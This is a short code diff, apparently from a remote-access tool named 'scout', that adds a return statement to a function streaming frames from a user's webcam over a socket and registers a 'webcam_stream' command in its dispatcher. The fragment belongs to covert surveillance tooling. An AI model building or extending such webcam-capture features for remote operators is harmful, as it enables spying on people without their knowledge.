@@ -20,7 +20,8 @@ def webcam_stream(sock):
                 send_all(sock, "[From scout] Acknowledged kill webcam stream")
                 return
         else:
-            send_all(sock, "[-]Hit an unexpected error while capturing frames from user webcam")''')
+            send_all(sock, "[-]Hit an unexpected error while capturing frames from user webcam")
+            return''')
         config.logics.append('''
             elif command == "webcam_stream":
                 webcam_stream(s)''')
